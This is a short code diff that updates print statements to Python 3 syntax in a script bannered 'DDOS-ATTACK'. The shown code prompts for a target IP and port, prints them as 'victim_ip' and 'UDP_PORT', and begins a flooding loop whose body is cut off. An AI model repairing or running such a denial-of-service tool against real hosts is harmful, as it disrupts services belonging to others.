@@ -37,7 +37,7 @@ class color:
 def menu():
     title()
     cls()
-    print color.green + """
+    print(color.green + """
  ______   ______   _______  _______         _______  _______  _______  _______  _______  ___   _
 |      | |      | |       ||       |       |   _   ||       ||       ||   _   ||       ||   | | |
 |  _    ||  _    ||   _   ||  _____| ____  |  |_|  ||_     _||_     _||  |_|  ||       ||   |_| |
@@ -46,7 +46,7 @@ def menu():
 |       ||       ||       | _____| |       |   _   |  |   |    |   |  |   _   ||     |_ |    _  |
 |______| |______| |_______||_______|       |__| |__|  |___|    |___|  |__| |__||_______||___| |_|\n""" + color.blue + """
      ----[    This code write by (Mr.nope)   ]---
-     -------[ github :""" + color.blue + """ https://github.com/mrprogrammer2938/ ]-----------""" + color.End
+     -------[ github :""" + color.blue + """ https://github.com/mrprogrammer2938/ ]-----------""" + color.End)
     web = input("\nEnter Target ip: ")
     time.sleep(1)
     port = input("\nEnter Target port: ")
@@ -59,7 +59,7 @@ def menu():
     print("Target IP:", victim_ip)
     time.sleep(1)
     print("\nTarget port:", UDP_PORT)
-    color.red + "=============================================================================\n" + color.End)
+    print(color.red + "=============================================================================\n" + color.End)
     time.sleep(3)
     def run(k):
         while True:
